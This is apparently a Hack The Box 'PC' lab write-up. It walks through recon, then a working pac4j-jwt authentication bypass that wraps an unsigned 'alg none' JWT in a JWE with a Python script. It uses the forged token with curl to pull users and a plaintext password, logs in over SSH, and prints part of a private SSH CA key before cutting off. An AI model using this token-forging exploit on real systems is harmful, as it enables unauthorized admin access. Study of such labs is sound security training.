---
tags:
title: PC - Easy (HTB)
permalink: /PC-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
zs1n@ptw ~> nmapf 10.129.12.231
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 15:18 -0400
Initiating Ping Scan at 15:18
Scanning 10.129.12.231 [4 ports]
Completed Ping Scan at 15:18, 0.27s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:18
Completed Parallel DNS resolution of 1 host. at 15:18, 0.50s elapsed
Initiating SYN Stealth Scan at 15:18
Scanning 10.129.12.231 [65535 ports]
Discovered open port 8080/tcp on 10.129.12.231
Discovered open port 22/tcp on 10.129.12.231
Completed SYN Stealth Scan at 15:18, 8.59s elapsed (65535 total ports)
Nmap scan report for 10.129.12.231
Host is up, received echo-reply ttl 63 (0.20s latency).
Scanned at 2026-03-26 15:18:22 EDT for 8s
Not shown: 65290 closed tcp ports (reset), 243 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds
           Raw packets sent: 82130 (3.614MB) | Rcvd: 80392 (3.216MB)
-e [*] IP: 10.129.12.231
[*] Puertos abiertos: 22,8080
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,8080 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-26 15:18 -0400
Nmap scan report for principal.htb (10.129.12.231)
Host is up (0.33s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)
8080/tcp open  http-proxy Jetty
| http-title: Principal Internal Platform - Login
|_Requested resource was /login
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Jetty
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Date: Thu, 26 Mar 2026 19:18:39 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: application/json
|     {"timestamp":"2026-03-26T19:18:39.276+00:00","status":404,"error":"Not Found","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}
|   GetRequest:
|     HTTP/1.1 302 Found
|     Date: Thu, 26 Mar 2026 19:18:32 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Content-Language: en
|     Location: /login
|     Content-Length: 0
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     Date: Thu, 26 Mar 2026 19:18:36 GMT
|     Server: Jetty
|     X-Powered-By: pac4j-jwt/6.0.3
|     Allow: GET,HEAD,OPTIONS
|     Accept-Patch:
|     Content-Length: 0
|   RTSPRequest:
|     HTTP/1.1 505 HTTP Version Not Supported
|     Date: Thu, 26 Mar 2026 19:18:37 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 349
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 505 Unknown Version</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 505 Unknown Version</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>505</td></tr>
|     <tr><th>MESSAGE:</th><td>Unknown Version</td></tr>
|     </table>
|     </body>
|     </html>
|   Socks5:
|     HTTP/1.1 400 Bad Request
|     Date: Thu, 26 Mar 2026 19:18:40 GMT
|     Cache-Control: must-revalidate,no-cache,no-store
|     Content-Type: text/html;charset=iso-8859-1
|     Content-Length: 382
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1"/>
|     <title>Error 400 Illegal character CNTL=0x5</title>
|     </head>
|     <body>
|     <h2>HTTP ERROR 400 Illegal character CNTL=0x5</h2>
|     <table>
|     <tr><th>URI:</th><td>/badMessage</td></tr>
|     <tr><th>STATUS:</th><td>400</td></tr>
|     <tr><th>MESSAGE:</th><td>Illegal character CNTL=0x5</td></tr>
|     </table>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.98%I=7%D=3/26%Time=69C58691%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,A4,"HTTP/1\.1\x20302\x20Found\r\nDate:\x20Thu,\x2026\x20Mar\x2
SF:02026\x2019:18:32\x20GMT\r\nServer:\x20Jetty\r\nX-Powered-By:\x20pac4j-
SF:jwt/6\.0\.3\r\nContent-Language:\x20en\r\nLocation:\x20/login\r\nConten
SF:t-Length:\x200\r\n\r\n")%r(HTTPOptions,A2,"HTTP/1\.1\x20200\x20OK\r\nDa
SF:te:\x20Thu,\x2026\x20Mar\x202026\x2019:18:36\x20GMT\r\nServer:\x20Jetty
SF:\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nAllow:\x20GET,HEAD,OPTIONS\r\
SF:nAccept-Patch:\x20\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,220,
SF:"HTTP/1\.1\x20505\x20HTTP\x20Version\x20Not\x20Supported\r\nDate:\x20Th
SF:u,\x2026\x20Mar\x202026\x2019:18:37\x20GMT\r\nCache-Control:\x20must-re
SF:validate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-88
SF:59-1\r\nContent-Length:\x20349\r\n\r\n<html>\n<head>\n<meta\x20http-equ
SF:iv=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<tit
SF:le>Error\x20505\x20Unknown\x20Version</title>\n</head>\n<body>\n<h2>HTT
SF:P\x20ERROR\x20505\x20Unknown\x20Version</h2>\n<table>\n<tr><th>URI:</th
SF:><td>/badMessage</td></tr>\n<tr><th>STATUS:</th><td>505</td></tr>\n<tr>
SF:<th>MESSAGE:</th><td>Unknown\x20Version</td></tr>\n</table>\n\n</body>\
SF:n</html>\n")%r(FourOhFourRequest,13B,"HTTP/1\.1\x20404\x20Not\x20Found\
SF:r\nDate:\x20Thu,\x2026\x20Mar\x202026\x2019:18:39\x20GMT\r\nServer:\x20
SF:Jetty\r\nX-Powered-By:\x20pac4j-jwt/6\.0\.3\r\nCache-Control:\x20must-r
SF:evalidate,no-cache,no-store\r\nContent-Type:\x20application/json\r\n\r\
SF:n{\"timestamp\":\"2026-03-26T19:18:39\.276\+00:00\",\"status\":404,\"er
SF:ror\":\"Not\x20Found\",\"path\":\"/nice%20ports%2C/Tri%6Eity\.txt%2ebak
SF:\"}")%r(Socks5,232,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Thu,
SF:\x2026\x20Mar\x202026\x2019:18:40\x20GMT\r\nCache-Control:\x20must-reva
SF:lidate,no-cache,no-store\r\nContent-Type:\x20text/html;charset=iso-8859
SF:-1\r\nContent-Length:\x20382\r\n\r\n<html>\n<head>\n<meta\x20http-equiv
SF:=\"Content-Type\"\x20content=\"text/html;charset=ISO-8859-1\"/>\n<title
SF:>Error\x20400\x20Illegal\x20character\x20CNTL=0x5</title>\n</head>\n<bo
SF:dy>\n<h2>HTTP\x20ERROR\x20400\x20Illegal\x20character\x20CNTL=0x5</h2>\
SF:n<table>\n<tr><th>URI:</th><td>/badMessage</td></tr>\n<tr><th>STATUS:</
SF:th><td>400</td></tr>\n<tr><th>MESSAGE:</th><td>Illegal\x20character\x20
SF:CNTL=0x5</td></tr>\n</table>\n\n</body>\n</html>\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.73 seconds
```

https://github.com/kernelzeroday/CVE-2026-29000

```bash
openssl genrsa 2048 | openssl rsa -pubout
```

```bash
zs1n@ptw ~> python -m token_forge --public-key pub.pem --subject admin --roles "ROLE_ADMIN,ROLE_USER"
2026-03-26 15:47:25,946 INFO [token_forge.cli] subject=admin roles=['ROLE_ADMIN', 'ROLE_USER'] exp_sec=3600 extra_claims=[]
2026-03-26 15:47:25,950 INFO [token_forge.cli] loaded key from path=pub.pem
2026-03-26 15:47:25,952 INFO [token_forge.cli] token_len=627 token_prefix=eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIn0.Dcaa97UUbHJg...
eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMjU2R0NNIn0.Dcaa97UUbHJgbs7GqGtwOi-5hNkJrqnkxQmUTJQarDwiaHWrYWyJerZkOIZoWvY3Fg633v8mMZj_9OUxy2rZUopwsjjGSDi_f-XzMTozDstDkp2Q_jReRFQ-TyOeqaUfiP8csptv1ydJJW0ZTZvYrtyxMB5RW05xTkx0JJUGWyn8lmPpj9lFhmR78hELnTXmj4MnDaaH_AWnIG8EtJ0RF5PAzHLhN_i69jOPGvl_CpoObEMhIN2N2o3-sS5DJ00xHnsTzXkvtil7qyhrM4wtI8GQO55EYdpYbZLoz1eBQ6sCgeacDrWkvizww7gDYBV6YxvXQxnoOsdAk1O9rE6_dA.ViiQPmTODcGX5qlF.6BkhFxmh71zbzu16IonkEC1Zh9xt3jymqUm9j7nq-rfDTgGLrxtoUuGTa0-OMygh5ZBLiLjAkkp2IjE65qkIThQ0Ak8piT4QEl-nuE5XWDOL9_gPnJ-a7c1AvN8g9DrFHjgml3S6wUR8S6E12f-lbnPtwVJgBCDYXwwASTjWiXNYKlp2.QoFilMgUZkUanefq56vkWQ
```

![[Pasted image 20260326165113.png]]

```js
/**
 * Principal Internal Platform - Client Application
 * Version: 1.2.0
 *
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */

const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';

// Role constants - must match server-side role definitions
const ROLES = {
    ADMIN: 'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER: 'ROLE_USER'
};

// Token management
class TokenManager {
    static getToken() {
        return sessionStorage.getItem('auth_token');
    }

    static setToken(token) {
        sessionStorage.setItem('auth_token', token);
    }

    static clearToken() {
        sessionStorage.removeItem('auth_token');
    }

    static isAuthenticated() {
        return !!this.getToken();
    }

    static getAuthHeaders() {
        const token = this.getToken();
        return token ? { 'Authorization': `Bearer ${token}` } : {};
    }
}

// API client
class ApiClient {
    static async request(endpoint, options = {}) {
        const defaults = {
            headers: {
                'Content-Type': 'application/json',
                ...TokenManager.getAuthHeaders()
            }
        };

        const config = { ...defaults, ...options, headers: { ...defaults.headers, ...options.headers } };

        try {
            const response = await fetch(`${API_BASE}${endpoint}`, config);

            if (response.status === 401) {
                TokenManager.clearToken();
                if (window.location.pathname !== '/login') {
                    window.location.href = '/login';
                }
                throw new Error('Authentication required');
            }

            return response;
        } catch (error) {
            if (error.message === 'Authentication required') throw error;
            throw new Error('Network error. Please try again.');
        }
    }

    static async get(endpoint) {
        return this.request(endpoint);
    }

    static async post(endpoint, data) {
        return this.request(endpoint, {
            method: 'POST',
            body: JSON.stringify(data)
        });
    }

    /**
     * Fetch JWKS for token verification
     * Used by client-side token inspection utilities
     */
    static async fetchJWKS() {
        const response = await fetch(JWKS_ENDPOINT);
        return response.json();
    }
}

/**
 * Render dashboard navigation based on user role.
 * Admin users (ROLE_ADMIN) get access to user management and system settings.
 * Managers (ROLE_MANAGER) get read-only access to team dashboards.
 * Regular users (ROLE_USER) only see their own deployment panel.
 */
function renderNavigation(role) {
    const navItems = [
        { label: 'Dashboard', endpoint: DASHBOARD_ENDPOINT, roles: [ROLES.ADMIN, ROLES.MANAGER, ROLES.USER] },
        { label: 'Users', endpoint: USERS_ENDPOINT, roles: [ROLES.ADMIN] },
        { label: 'Settings', endpoint: SETTINGS_ENDPOINT, roles: [ROLES.ADMIN] },
    ];

    return navItems.filter(item => item.roles.includes(role));
}

// Login form handler
function initLoginForm() {
    const form = document.getElementById('loginForm');
    if (!form) return;

    // Redirect if already authenticated
    if (TokenManager.isAuthenticated()) {
        window.location.href = '/dashboard';
        return;
    }

    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;
        const errorEl = document.getElementById('errorMessage');
        const btnText = document.querySelector('.btn-text');
        const btnLoading = document.querySelector('.btn-loading');
        const loginBtn = document.getElementById('loginBtn');

        // Reset error
        errorEl.style.display = 'none';

        if (!username || !password) {
            showError('Please enter both username and password.');
            return;
        }

        // Show loading state
        loginBtn.disabled = true;
        btnText.style.display = 'none';
        btnLoading.style.display = 'flex';

        try {
            const response = await ApiClient.post(AUTH_ENDPOINT, { username, password });
            const data = await response.json();

            if (response.ok) {
                TokenManager.setToken(data.token);
                // Token is JWE encrypted - decryption handled server-side
                // JWKS at /api/auth/jwks provides the encryption public key
                window.location.href = '/dashboard';
            } else {
                showError(data.message || 'Authentication failed. Please check your credentials.');
            }
        } catch (error) {
            showError(error.message || 'An error occurred. Please try again.');
        } finally {
            loginBtn.disabled = false;
            btnText.style.display = 'inline';
            btnLoading.style.display = 'none';
        }
    });
}

function showError(message) {
    const errorEl = document.getElementById('errorMessage');
    errorEl.textContent = message;
    errorEl.style.display = 'flex';
}

function togglePassword() {
    const input = document.getElementById('password');
    input.type = input.type === 'password' ? 'text' : 'password';
}

// Dashboard page handler
async function initDashboard() {
    const container = document.getElementById('dashboardApp');
    if (!container) return;

    if (!TokenManager.isAuthenticated()) {
        window.location.href = '/login';
        return;
    }

    try {
        const resp = await ApiClient.get(DASHBOARD_ENDPOINT);
        if (!resp.ok) throw new Error('Failed to load dashboard');
        const data = await resp.json();

        const user = data.user;
        const stats = data.stats;

        document.getElementById('welcomeUser').textContent = user.username;
        document.getElementById('userRole').textContent = user.role;

        // Stats cards
        document.getElementById('statUsers').textContent = stats.totalUsers;
        document.getElementById('statDeploys').textContent = stats.activeDeployments;
        document.getElementById('statHealth').textContent = stats.systemHealth;
        document.getElementById('statUptime').textContent = stats.uptimePercent + '%';

        // Build navigation based on role
        const nav = renderNavigation(user.role);
        const navEl = document.getElementById('sideNav');
        navEl.innerHTML = nav.map(item =>
            `<a href="#" class="nav-item" data-endpoint="${item.endpoint}">${item.label}</a>`
        ).join('');

        navEl.querySelectorAll('.nav-item').forEach(el => {
            el.addEventListener('click', async (e) => {
                e.preventDefault();
                navEl.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
                el.classList.add('active');
                await loadPanel(el.dataset.endpoint);
            });
        });

        // Mark first nav active
        const firstNav = navEl.querySelector('.nav-item');
        if (firstNav) firstNav.classList.add('active');

        // Activity log
        const logBody = document.getElementById('activityLog');
        logBody.innerHTML = data.recentActivity.map(a =>
            `<tr><td>${a.timestamp}</td><td><span class="badge badge-${a.action.includes('FAIL') ? 'danger' : 'info'}">${a.action}</span></td><td>${a.username}</td><td>${a.details}</td></tr>`
        ).join('');

        // Announcements
        const announcementsEl = document.getElementById('announcements');
        announcementsEl.innerHTML = data.announcements.map(a =>
            `<div class="announcement ${a.severity}"><strong>${a.title}</strong><p>${a.message}</p><small>${a.date}</small></div>`
        ).join('');

    } catch (err) {
        console.error('Dashboard load error:', err);
    }
}

async function loadPanel(endpoint) {
    const panel = document.getElementById('contentPanel');
    try {
        const resp = await ApiClient.get(endpoint);
        const data = await resp.json();

        if (resp.status === 403) {
            panel.innerHTML = `<div class="panel-error"><h3>Access Denied</h3><p>${data.message}</p></div>`;
            return;
        }

        if (endpoint === USERS_ENDPOINT) {
            panel.innerHTML = `<h3>User Management</h3><table class="data-table"><thead><tr><th>Username</th><th>Name</th><th>Role</th><th>Department</th><th>Status</th><th>Notes</th></tr></thead><tbody>${
                data.users.map(u => `<tr><td>${u.username}</td><td>${u.displayName}</td><td><span class="badge">${u.role}</span></td><td>${u.department}</td><td>${u.active ? '<span class="badge badge-success">Active</span>' : '<span class="badge badge-danger">Disabled</span>'}</td><td>${u.note}</td></tr>`).join('')
            }</tbody></table>`;
        } else if (endpoint === SETTINGS_ENDPOINT) {
            panel.innerHTML = `<h3>System Settings</h3>
                <div class="settings-grid">
                    <div class="settings-section"><h4>System</h4><dl>${Object.entries(data.system).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                    <div class="settings-section"><h4>Security</h4><dl>${Object.entries(data.security).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                    <div class="settings-section"><h4>Infrastructure</h4><dl>${Object.entries(data.infrastructure).map(([k,v]) => `<dt>${k}</dt><dd>${v}</dd>`).join('')}</dl></div>
                </div>`;
        } else {
            panel.innerHTML = `<pre>${JSON.stringify(data, null, 2)}</pre>`;
        }
    } catch (err) {
        panel.innerHTML = `<div class="panel-error">Error loading data</div>`;
    }
}

function logout() {
    TokenManager.clearToken();
    window.location.href = '/login';
}

// Initialize
document.addEventListener('DOMContentLoaded', () => {
    initLoginForm();
    initDashboard();

    // Prefetch JWKS for token handling
    if (window.location.pathname === '/login') {
        ApiClient.fetchJWKS().then(jwks => {
            // Cache JWKS for client-side token operations
            window.__jwks = jwks;
        }).catch(() => {
            // JWKS fetch is non-critical for login flow
        });
    }
});
```

![[Pasted image 20260326165321.png]]

```python
import json
import time
import base64
import requests
from jwcrypto import jwk, jwe, jwt

# --- SIMULACIÓN DE ENTORNO (Para que el script corra) ---
# En un escenario real, TARGET vendría de sys.argv[1]
# Aquí generamos una llave para demostrar el funcionamiento
key_obj = jwk.JWK.generate(kty='RSA', size=2048, kid="server-key-1")
public_key = key_obj # El atacante solo tendría esta parte (vía JWKS)
private_key = key_obj # El servidor usa esta para descifrar

def create_jwt_segment(payload):
    """Crea un segmento Base64URL sin padding (estilo JWT)"""
    return base64.urlsafe_b64encode(payload.encode()).rstrip(b'=').decode()

# === ATTACKER SIDE ===

now = int(time.time())

# Paso 1: Crear el JWT interno MALICIOSO (Unsigned / PlainJWT)
# Usamos "alg": "none" para que sea un PlainJWT según el estándar
header_json = json.dumps({"alg": "none"})
payload_json = json.dumps({
    "sub": "admin",
    "iat": now,
    "exp": now + 3600,
    "role": "ROLE_ADMIN"
})

header_segment = create_jwt_segment(header_json)
payload_segment = create_jwt_segment(payload_json)

# El token interno no lleva firma (termina en punto)
inner_jwt = f"{header_segment}.{payload_segment}."

print(f"[ATTACKER] Crafted Inner JWT: {inner_jwt[:50]}...")

# Paso 2: Envolverlo en un JWE usando la llave pública del servidor
# Tal como en tu imagen, configuramos el cifrado RSA-OAEP-256
jwe_token = jwe.JWE(
    inner_jwt.encode(), # El payload es el JWT sin firma
    recipient=public_key,
    protected={
        "alg": "RSA-OAEP-256",
        "enc": "A128GCM", # O A256GCM como en el Java original
        "cty": "JWT",     # CRÍTICO: Indica que el contenido es un JWT
        "kid": public_key.get("kid")
    }
)

token_final = jwe_token.serialize(compact=True)

print(f"[ATTACKER] Crafted JWE: {token_final[:80]}...")

# === SERVER SIDE (Simulación de bypass) ===

try:
    # El servidor recibe el JWE y lo descifra con su llave privada
    jwe_recibido = jwe.JWE()
    jwe_recibido.deserialize(token_final, key=private_key)
    
    # El servidor extrae el payload (que es nuestro JWT malicioso)
    content = jwe_recibido.payload.decode()
    
    # Si el servidor confía ciegamente en el contenido tras descifrar:
    print("\n[BYPASS SUCCESSFUL]")
    print(f"Server extracted payload: {content}")
    
except Exception as e:
    print(f"\n[FAILED] {e}")
```

```bash
zs1n@ptw ~> python3 jwk.py
[ATTACKER] Crafted Inner JWT: eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4iLCAiaWF0I...
[ATTACKER] Crafted JWE: eyJhbGciOiJSU0EtT0FFUC0yNTYiLCJjdHkiOiJKV1QiLCJlbmMiOiJBMTI4R0NNIiwia2lkIjoic2Vy...

[BYPASS SUCCESSFUL]
Server extracted payload: eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTc3NDU1ODQ5NSwgImV4cCI6IDE3NzQ1NjIwOTUsICJyb2xlIjogIlJPTEVfQURNSU4ifQ.

zs1n@ptw ~> token="eyJhbGciOiAibm9uZSJ9.eyJzdWIiOiAiYWRtaW4iLCAiaWF0IjogMTc3NDU1ODQ5NSwgImV4cCI6IDE3NzQ1NjIwOTUsICJyb2xlIjogIlJPTEVfQURNSU4ifQ."

zs1n@ptw ~> curl -s -X GET -k -H "Authorization: Bearer $token" http://principal.htb:8080/api/users
{"users":[{"role":"ROLE_ADMIN","active":true,"lastLogin":"2025-12-28T09:15:00Z","id":1,"department":"IT Security","displayName":"Sarah Chen","email":"s.chen@principal-corp.local","username":"admin","note":""},{"role":"deployer","active":true,"lastLogin":"2025-12-28T14:32:00Z","id":2,"department":"DevOps","displayName":"Deploy Service","email":"svc-deploy@principal-corp.local","username":"svc-deploy","note":"Service account for automated deployments via SSH certificate auth."},{"role":"ROLE_USER","active":true,"lastLogin":"2025-12-27T16:45:00Z","id":3,"department":"Engineering","displayName":"James Thompson","email":"j.thompson@principal-corp.local","username":"jthompson","note":"Team lead - backend services"},{"role":"ROLE_USER","active":true,"lastLogin":"2025-12-28T08:20:00Z","id":4,"department":"Engineering","displayName":"Ana Morales","email":"a.morales@principal-corp.local","username":"amorales","note":"Frontend developer"},{"role":"ROLE_MANAGER","active":true,"lastLogin":"2025-12-26T11:30:00Z","id":5,"department":"Operations","displayName":"Benjamin Wright","email":"b.wright@principal-corp.local","username":"bwright","note":"Operations manager"},{"role":"ROLE_ADMIN","active":false,"lastLogin":"2025-12-20T10:00:00Z","id":6,"department":"IT Security","displayName":"Kavitha Kumar","email":"k.kumar@principal-corp.local","username":"kkumar","note":"Security analyst - on leave until Jan 6"},{"role":"ROLE_USER","active":true,"lastLogin":"2025-12-28T13:10:00Z","id":7,"department":"QA","displayName":"Marcus Wilson","email":"m.wilson@principal-corp.local","username":"mwilson","note":"QA engineer"},{"role":"ROLE_MANAGER","active":true,"lastLogin":"2025-12-28T07:55:00Z","id":8,"department":"Engineering","displayName":"Lisa Zhang","email":"l.zhang@principal-corp.local","username":"lzhang","note":"Engineering director"}],"total":8}
zs1n@ptw ~> curl -s -X GET -k -H "Authorization: Bearer $token" http://principal.htb:8080/api/users | jq .
{
  "users": [
    {
      "role": "ROLE_ADMIN",
      "active": true,
      "lastLogin": "2025-12-28T09:15:00Z",
      "id": 1,
      "department": "IT Security",
      "displayName": "Sarah Chen",
      "email": "s.chen@principal-corp.local",
      "username": "admin",
      "note": ""
    },
    {
      "role": "deployer",
      "active": true,
      "lastLogin": "2025-12-28T14:32:00Z",
      "id": 2,
      "department": "DevOps",
      "displayName": "Deploy Service",
      "email": "svc-deploy@principal-corp.local",
      "username": "svc-deploy",
      "note": "Service account for automated deployments via SSH certificate auth."
    },
    {
      "role": "ROLE_USER",
      "active": true,
      "lastLogin": "2025-12-27T16:45:00Z",
      "id": 3,
      "department": "Engineering",
      "displayName": "James Thompson",
      "email": "j.thompson@principal-corp.local",
      "username": "jthompson",
      "note": "Team lead - backend services"
    },
    {
      "role": "ROLE_USER",
      "active": true,
      "lastLogin": "2025-12-28T08:20:00Z",
      "id": 4,
      "department": "Engineering",
      "displayName": "Ana Morales",
      "email": "a.morales@principal-corp.local",
      "username": "amorales",
      "note": "Frontend developer"
    },
    {
      "role": "ROLE_MANAGER",
      "active": true,
      "lastLogin": "2025-12-26T11:30:00Z",
      "id": 5,
      "department": "Operations",
      "displayName": "Benjamin Wright",
      "email": "b.wright@principal-corp.local",
      "username": "bwright",
      "note": "Operations manager"
    },
    {
      "role": "ROLE_ADMIN",
      "active": false,
      "lastLogin": "2025-12-20T10:00:00Z",
      "id": 6,
      "department": "IT Security",
      "displayName": "Kavitha Kumar",
      "email": "k.kumar@principal-corp.local",
      "username": "kkumar",
      "note": "Security analyst - on leave until Jan 6"
    },
    {
      "role": "ROLE_USER",
      "active": true,
      "lastLogin": "2025-12-28T13:10:00Z",
      "id": 7,
      "department": "QA",
      "displayName": "Marcus Wilson",
      "email": "m.wilson@principal-corp.local",
      "username": "mwilson",
      "note": "QA engineer"
    },
    {
      "role": "ROLE_MANAGER",
      "active": true,
      "lastLogin": "2025-12-28T07:55:00Z",
      "id": 8,
      "department": "Engineering",
      "displayName": "Lisa Zhang",
      "email": "l.zhang@principal-corp.local",
      "username": "lzhang",
      "note": "Engineering director"
    }
  ],
  "total": 8
}
```

```bash
zs1n@ptw ~> curl -s -X GET -k -H "Authorization: Bearer $token" http://principal.htb:8080/api/settings | jq .
{
  "security": {
    "authFramework": "pac4j-jwt",
    "authFrameworkVersion": "6.0.3",
    "jwtAlgorithm": "RS256",
    "jweAlgorithm": "RSA-OAEP-256",
    "jweEncryption": "A128GCM",
    "encryptionKey": "D3pl0y_$$H_Now42!",
    "tokenExpiry": "3600s",
    "sessionManagement": "stateless"
  },
```

```bash
zs1n@ptw ~> ssh svc-deploy@principal.htb
svc-deploy@principal.htb's password:
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
svc-deploy@principal:~$ cat user.txt
8a47188bd3c199a229f4399e33a4dc2b
```

```bash
svc-deploy@principal:/opt/principal/ssh$ cat ca
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAgEAupcTUsyUBVNyv9BSynItQWa/hy9VE0OOcvJ85btLVWghXJbhGWcj
7t8IAuF2whpooZvMMqAYCVyOgWckU6Ys5hyWQIzZr4vZ3FKEtOkaZfqAL/BNxroHXEKIJU
j+zXptCZ6Zh6Di/xbUrWij07aBGB1nN61XemARn1wqxdJRIBbEHMBTi5D6Et+SHZ2anI97
wbc+wLKHdqols7ZOpdlB42cq1ClMYkREV7K+7jbWPcUoANQpYWXcdzFBNYp7ZG1IHRQtcm
F0vpbL5VA/zeeGGC0ih+xlbDBc1f3FrMYMfM/Qn4A70vjNAVUaxohE5nGNYwCzk5Z+zwpy
5drwtUa9I+27bvfQ2Ky5mI+C/ToCox3l+yJ1UAhp6ER1qU4cqd1pnZ1qIIQIsgC7oi9/V1
0KXp9rexkHfs0+UG79h6S1uIblSl6GPttikm1bAIRQHsYGctOH8SmcOjOWM8yANvCVpyF3
Qm8XWIVZvEM5ZyhxISNidU//cK1LwRUEBMZl67fxx5iWa4zX45HeLVLGqy5QDSe4pTTDUs
5N0LiadrdiOyATuiTvHkLeYxBUj27SGr/bvLz7EyzEYzH66asYgAPlQKM83jmGSxIQlmrV
k0MOsM6Z2/fqnwKEI9ZBoT03pTrZnS8fHSbaksOTuBzAIZZyLY6q8a+e/t99xYNYmqgb7J
kAAAdIrktniq5LZ4oAAAAHc3NoLXJzYQAAAgEAupcTUsyUBVNyv9BSynItQWa/hy9VE0OO
cvJ85btLVWghXJbhGWcj7t8IAuF2whpooZvMMqAYCVyOgWckU6Ys5hyWQIzZr4vZ3FKEtO
kaZfqAL/BNxroHXEKIJUj+zXptCZ6Zh6Di/xbUrWij07aBGB1nN61XemARn1wqxdJRIBbE
HMBTi5D6Et+SHZ2anI97wbc+wLKHdqols7ZOpdlB42cq1ClMYkREV7K+7jbWPcUoANQpYW
XcdzFBNYp7ZG1IHRQtcmF0vpbL5VA/zeeGGC0ih+xlbDBc1f3FrMYMfM/Qn4A70vjNAVUa
xohE5nGNYwCzk5Z+zwpy5drwtUa9I+27bvfQ2Ky5mI+C/ToCox3l+yJ1UAhp6ER1qU4cqd
1pnZ1qIIQIsgC7oi9/V10KXp9rexkHfs0+UG79h6S1uIblSl6GPttikm1bAIRQHsYGctOH
8SmcOjOWM8yANvCVpyF3Qm8XWIVZvEM5ZyhxISNidU//cK1LwRUEBMZl67fxx5iWa4zX45
HeLVLGqy5QDSe4pTTDUs5N0LiadrdiOyATuiTvHkLeYxBUj27SGr/bvLz7EyzEYzH66asY
gAPlQKM83jmGSxIQlmrVk0MOsM6Z2/fqnwKEI9ZBoT03pTrZnS8fHSbaksOTuBzAIZZyLY
6q8a+e/t99xYNYmqgb7JkAAAADAQABAAACABJNXRR9M2Q52Rq6QBKyRCDjB5SmpodJFD0P
bsOYfWVTXVlgBdSobqiAuUASFkRoE30No4gQNsddTC+ierhXR5ZrNaw/fJ9I3h3rvK9joY
